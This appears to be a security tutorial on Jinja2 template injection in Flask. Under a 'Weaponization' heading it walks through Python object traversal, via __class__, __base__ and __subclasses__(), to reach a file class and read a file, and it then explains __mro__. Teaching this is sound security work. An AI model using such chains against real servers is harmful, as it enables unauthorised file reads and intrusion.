# Theory
Jinja2 is a powerful templating engine used in Flask. While it does many more things, it essentially allows us to write HTML templates with placeholders that are later dynamically populated by the application.

```text-plain
<div>
    <h1>Article</h1>
    {{ article_text }}
</div>
```

In the example above, we can see a a straightforward Jinja2 template. When rendering the template, Jina2 will dynamically replace \`\` with the corresponding variable.

In Flask, this would be used as follows:

```text-plain
@app.route('/index')
def index():
    article = ...
    return render_template('article.html', article_text=article)
```

We assume that the template is stored in a file called `article.html`. When this route is called, `{{ article_text }}` will be replaced with `article` before sending the content to the user.

In a similar fashion, we could also use `render_template_string(template)` to use a template string instead of a file. This is what you will see below.

### Navigating Python Objects and Inheritance Trees

In Python, everything is an object! While this is a fundamental property and feature of the language, we are going to focus on one very particular thing one can do: navigating the inheritance tree of objects and, thus, classes.

In the following example, we are trying to read a file called `test.txt` using `_io.FileIO`. However, instead of just using regular function calls, we will start from a `str` object and work our way to the `_io.FileIO` class.

Weaponization:
--------------

We start with a simple `str` object. For now, we are using _abc_, but it could be any arbitrary string:

```text-plain
'abc'
```

Now we access its `__class__`:

```text-plain
'abc'.__class__
```

Going further, we access its `__base__`:

```text-plain
'abc'.__class__.__base__
```

Now, we can look at all `__subclasses__` of `object`. This will get us a long list of available Python classes.

```text-plain
'abc'.__class__.__base__.__subclasses__()
```

In this list, we are now looking for the `_io._IOBase` class, which, in this example, sits at index 96 of the `__subclasses__`:

```text-plain
'abc'.__class__.__base__.__subclasses__()[96]
```

We need to go further to find the `_io._RawIOBase` class. Hence, we are repeating the same process as above:

```text-plain
'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0]
```

Finally, we can use this class to construct a file object and read our file:

```text-plain
'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('test.txt').read()
```

Do not let this confuse or discourage you! Ultimately, we are still working with a regular file object. However, instead of just using, for example, `open()`, we navigated to it starting from a `str` object.

`__mro__`
---------

Especially if you are looking at other examples, you will also come across Python’s Method Resolution Order (MRO). While the MRO, especially looking at differences between old-style and new-style classes, is very interesting, we primarily care for `__mro__` right now. As per the [documentation](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__), “\[t\]his attribute is a tuple of classes that are considered when looking for base classes during method resolution.”

Put simply, while `__subclassess__` can be used to go down inherited objects, `__mro__` allows us to go back up the inheritance tree.

```text-plain
A.__subclasses__()
=> [__main__.B_one, __main__.B_two]
```

`A` is inherited by both `B_one` and `B_two`.

```text-plain
C.__mro__
=> (__main__.C, __main__.B_one, __main__.A, object)
```

`C` has inherited `B` and hence also, albeit indirectly, `A`